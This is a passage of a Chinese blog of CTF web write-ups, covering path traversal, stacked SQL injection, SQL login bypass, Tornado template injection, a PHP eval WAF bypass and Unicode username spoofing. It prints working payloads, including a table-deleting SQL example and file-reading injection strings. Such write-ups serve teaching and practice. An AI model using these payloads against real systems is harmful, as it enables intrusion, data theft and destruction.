$whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];	</span><br><span class="line">            </span><br><span class="line">        # 若$page不存在或者不是字符串    </span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        # 打印you can&#39;t see it</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">		# 判断变量$page存在$whitelist数组中</span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        # 返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">		# 截取$page中&#39;?&#39;前部分，若无则取整个$page</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">        # 判断截取完的$page是否在在白名单中</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        # 在返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">		# url解码</span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            </span><br><span class="line">        # 在进行截取......</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">        # 判断截取完的$page是否在在白名单中</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        # 在返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        # 否则返回false</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到函数代码中有四个if语句</p>
<ul>
<li>第一个if语句对变量进行检验，要求$page为字符串，否则返回false</li>
<li>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true</li>
<li>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true</li>
<li>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br> 若以上四个if语句均未返回值，则返回false</li>
</ul>
<p>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br> 第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br> 第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：</p>
<p><code>http://***:***/source.php/%253f../ffffllllaaaagggg</code></p>
<p>无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在</p>
<p><code>http://***:***/source.php/%253f../../../../../ffffllllaaaagggg</code>成功回显flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616140331329.png" alt="image-20200616140331329"></p>
<h3 id="强网杯-2019-随便注1"><a href="#强网杯-2019-随便注1" class="headerlink" title="[强网杯 2019]随便注1"></a>[强网杯 2019]随便注1</h3><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p>
<h4 id="堆叠原理"><a href="#堆叠原理" class="headerlink" title="堆叠原理"></a>堆叠原理</h4><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p>
<h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><p>执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了。</p>
<p><code>mysql&gt; select * from users where id =1;delete from users;</code></p>
<p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155324366.png" alt="image-20200616155324366"></p>
<p>使用 or 可以把表中所有数据都查询出来，但是并没有我们需要的flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155437231.png" alt="image-20200616155437231"></p>
<p>使用order by查看字段数，当order by 2的时候返回正常，order by 3就出错了，只有两个字段，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155537988.png" alt="image-20200616155537988"></p>
<p>这时候用union select进行联合查询，返回一个正则过滤规则，可以看到几乎所有的字段都过滤了，所以这里用堆叠注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155639126.png" alt="image-20200616155639126"></p>
<p>查看当前数据库，可以看到成功了，存在堆叠注入，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155743896.png" alt="image-20200616155743896"></p>
<p>我们在用show tables来查询一下能不能查出表，有两张表，分别看看两张表有什么字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155845687.png" alt="image-20200616155845687"></p>
<p>使用一下命令来查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;show columns from &#96;words&#96; ;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616160014968.png" alt="image-20200616160014968"></p>
<p>并没有flag，查看另一张表，可以看到有flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0’; show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616160051149.png" alt="image-20200616160051149"></p>
<p>注意：在windows系统下，反单引号(`)是数据库、表、索引、列和别名用的引用符</p>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM &#96;table&#96; WHERE &#96;id&#96; &#x3D; &#39;123&#39; ;</span><br></pre></td></tr></table></figure>

<p>其中1919810931114514必须用反单引号括起来，但是words不需要，应该是和数据类型有关。</p>
<p>查看一下words表结构，发现有id和data两个字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc words;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616164158609.png" alt="image-20200616164158609"></p>
<p>因为这里有两张表，会县内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢</p>
<p>内部查询语句类似 : select id, data from word where id =</p>
<p>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);show table;#</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>打开界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230414826.png" alt="image-20200616230414826"></p>
<p>试了一下有三种显示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230527277.png" alt="image-20200616230527277"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230539819.png" alt="image-20200616230539819"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230544576.png" alt="image-20200616230544576"></p>
<p>一共有以上三种显示</p>
<p>可以使用堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230851120.png" alt="image-20200616230851120"></p>
<p>可以看到有一个Flag表，测试发现from flag都被过滤不能直接读到flag。<br>想了很久想不到 看别人wp了~，听说比赛的时候原理泄漏了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure>

<p>这tm根本想不到</p>
<p>不过由于没有过滤 * 出现了一个意外解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616231105904.png" alt="image-20200616231105904"></p>
<h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090723586.png" alt="image-20200617090723586"></p>
<p>因为题目说用SQL注入，所以就可以明确了。</p>
<p>按照正常流程来一波，先在用户名处随便输入内容，加上一个单引号( ‘ )</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090900746.png" alt="image-20200617090900746"></p>
<p>登录，报错了，说明可以注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090919670.png" alt="image-20200617090919670"></p>
<p>返回，在引号后面加一个井号（#），页面返回正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090958992.png" alt="image-20200617090958992"></p>
<p>使用<code>order by</code> 查看字段数，这里当<code>order by 3</code>的时候页面返回正常，其他发返回错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091135646.png" alt="image-20200617091135646"></p>
<p>使用<code>union select 1,2,3#</code>来查看注入点</p>
<p>没想到flag直接出来了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091234044.png" alt="image-20200617091234044"></p>
<h4 id="还有一种方法"><a href="#还有一种方法" class="headerlink" title="还有一种方法"></a>还有一种方法</h4><p>使用万能密码登录</p>
<p>前面的123不一定非得是123，自己喜欢输入什么就输入什么</p>
<p><code>123&#39; or &#39;1&#39;=&#39;1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091425914.png" alt="image-20200617091425914"></p>
<p>也是成功的返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091416354.png" alt="image-20200617091416354"></p>
<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>打开网址</p>
<p>有三个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617095216591.png" alt="image-20200617095216591"></p>
<p>挨个打开</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;5b43f104291dd7435e0dcd18c4ed9d8a</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103924552.png" alt="image-20200617103924552"></p>
<p>URL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;67ac43a877052aa89c40b36ec5bc157e</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103941403.png" alt="image-20200617103941403"></p>
<p>URL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;04b56c16ce59e7b360eed3e1638e142c</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103948371.png" alt="image-20200617103948371"></p>
<p>有这三个内容，</p>
<p>发现render函数：将文件内容显示在网页上  <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq78827534%2Farticle%2Fdetails%2F80792514" target="_blank" rel="noopener">render函数介绍</a></p>
<p>测试之后发现还有一个error界面。格式为<code>/error?msg=error</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617104507291.png" alt="image-20200617104507291"></p>
<p>联想render函数，修改msg的参数</p>
<p>因为可以看到，nsg很后面跟着Error，也跟着打印出来了，尝试一下将其改为1，或者其他，看看能否打印</p>
<p>打印了。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617104841639.png" alt="image-20200617104841639"></p>
<p>尝试一下能否进行运算，</p>
<p>传递error?msg=2，页面输出2</p>
<p>传递error?msg=4，页面输出ORZ（除和减操作符也是返回ORZ，说明操作符被过滤了）。</p>
<p>仿照url格式，我们还需要知道filehash值，filehash是一个md5后的值，联想第三个界面</p>
<p>md5(cookie_secret+md5(filename))，我们还需要知道cookie_secret，那么tornado中的cookie通过模板注入要怎么拿到呢？<br>用的就是handler.settings对象</p>
<p>其中cookie_secret是在Tornado框架的附属文件handler.settings中</p>
<p>这样就可以构造URL：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617105527432.png" alt="image-20200617105527432"></p>
<p>复制这个cookue_secret，这样我们需要写一个PHP或者python都行，来计算filehash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cookie&#x3D;&#39;448b372f-9031-488e-83f3-35ce014c3baa&#39;;</span><br><span class="line">	$flag&#x3D;&#39;&#x2F;fllllllllllllag&#39;;</span><br><span class="line">	echo md5($cookie.md5($flag));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617105952296.png" alt="image-20200617105952296"></p>
<p>复制输出的MD5值</p>
<p>在URL中添加</p>
<p>将filename改为/fllllllllllllag，filehash改为输出的MD5值</p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;2b0f561c7b112c2c8b665bfb2048405b</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617110059578.png" alt="image-20200617110059578"></p>
<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121622838.png" alt="image-20200617121622838"></p>
<p>按F12查看一下源码</p>
<p>这里注释了一段代码，意思就是当cat等于dog时候输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121702435.png" alt="image-20200617121702435"></p>
<p>这里我们查看在url中构造一下，成功返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121751729.png" alt="image-20200617121751729"></p>
<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>看一下源码</p>
<p>这里面有一个calc.php，访问一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617142755512.png" alt="image-20200617142755512"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"># 判断是否为空</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line"># 不为空执行以下代码</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line"># 黑名单</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        </span><br><span class="line"># 遍历数组</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line"># 正则表达式对字符串进行搜索</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">            # 成功执行die</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       # 否则 输出str变量</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>扫一下根目录，发现有一个flagg文件</p>
<p>这里? num 中间要空格开，不能连起来写。</p>
<p><strong>解析：</strong>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617150348928.png" alt="image-20200617150348928"></p>
<p>查看flagg</p>
<p>解析：因为直接输入/flagg是不行的，所以转成ascii码</p>
<p>成功返回flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617150801953.png" alt="image-20200617150801953"></p>
<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155127550.png" alt="image-20200617155127550"></p>
<p>右上角有一个选择框查看内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155219302.png" alt="image-20200617155219302"></p>
<p>有一个登录和注册</p>
<p>随便注册一个登录试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155250871.png" alt="image-20200617155250871"></p>
<p>发现登录上去后有post、change password、logout功能。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155323634.png" alt="image-20200617155323634"></p>
<p>然后在index页面源码发现提示，<code>you are not admin</code>，估计题目是让我们登录成admin，然后出flag，于是想到change password功能，可能可以通过改密码功能的漏洞改掉admin密码，然后以admin登录。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155413109.png" alt="image-20200617155413109"></p>
<p>点击change password，于是跳到change password页面，看看有没有进一步的发现，也是在网页源代码处发现了提示，这个提示直接把网站项目的github地址给了出来。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155536349.png" alt="image-20200617155536349"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155654022.png" alt="image-20200617155654022"></p>
<p>复制网址打开看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617161654507.png" alt="image-20200617161654507"></p>
<p>是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">@app.route(&#39;&#x2F;index&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#39;index.html&#39;, title &#x3D; &#39;hctf&#39;)</span><br></pre></td></tr></table></figure>

<p>发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#39;header.html&#39;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;Hello &#123;&#123; session[&#39;name&#39;] &#125;&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#39;name&#39;] &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;Welcome to hctf&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&#123;% include(&#39;footer.html&#39;) %&#125;</span><br></pre></td></tr></table></figure>

<p>发现真的是要登录成admin才能得到flag。于是继续看向route.py文件，看看login和change password的注册函数处理代码是怎么写的。route.py部分函数代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;register&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def register():</span><br><span class="line"></span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line"></span><br><span class="line">    form &#x3D; RegisterForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(form.username.data)</span><br><span class="line">        if session.get(&#39;image&#39;).lower() !&#x3D; form.verify_code.data.lower():</span><br><span class="line">            flash(&#39;Wrong verify code.&#39;)</span><br><span class="line">            return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form&#x3D;form)</span><br><span class="line">        if User.query.filter_by(username &#x3D; name).first():</span><br><span class="line">            flash(&#39;The username has been registered&#39;)</span><br><span class="line">            return redirect(url_for(&#39;register&#39;))</span><br><span class="line">        user &#x3D; User(username&#x3D;name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&#39;register successful&#39;)</span><br><span class="line">        return redirect(url_for(&#39;login&#39;))</span><br><span class="line">    return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form &#x3D; form)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;login&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def login():</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line"></span><br><span class="line">    form &#x3D; LoginForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(form.username.data)</span><br><span class="line">        session[&#39;name&#39;] &#x3D; name</span><br><span class="line">        user &#x3D; User.query.filter_by(username&#x3D;name).first()</span><br><span class="line">        if user is None or not user.check_password(form.password.data):</span><br><span class="line">            flash(&#39;Invalid username or password&#39;)</span><br><span class="line">            return redirect(url_for(&#39;login&#39;))</span><br><span class="line">        login_user(user, remember&#x3D;form.remember_me.data)</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return render_template(&#39;login.html&#39;, title &#x3D; &#39;login&#39;, form &#x3D; form)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;logout&#39;)</span><br><span class="line">def logout():</span><br><span class="line">    logout_user()</span><br><span class="line">    return redirect(&#39;&#x2F;index&#39;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;change&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def change():</span><br><span class="line">    if not current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;login&#39;))</span><br><span class="line">    form &#x3D; NewpasswordForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(session[&#39;name&#39;])</span><br><span class="line">        user &#x3D; User.query.filter_by(username&#x3D;name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&#39;change successful&#39;)</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return render_template(&#39;change.html&#39;, title &#x3D; &#39;change&#39;, form &#x3D; form)</span><br></pre></td></tr></table></figure>

<p>这里面有三个解</p>
<p>直说其中一个，也是最简单的</p>
<h5 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h5><p>这个解法好像才是这个题目想要考查的点，我们可以发现，不管是login、register还是change页面，只要是关于session[‘name’]的操作，都先用了strlower函数将name转成小写，但是python中有自带的转小写函数<code>lower</code>，这里重写了一个，可能有点猫腻，于是找到strlower函数的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username &#x3D; nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure>

<p>这里用到了<code>nodeprep.prepare</code>函数，而nodeprep是从twisted模块中导入的<code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code>，在requirements.txt文件中，发现这里用到的twisted版本是<code>Twisted==10.2.0</code>，而官网最新版本为<code>19.2.0</code>(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下<code>nodeprep.prepare</code>，找到一篇unicode安全的文章，<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.tuisec.win%2Fdetail%2Fa9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p>
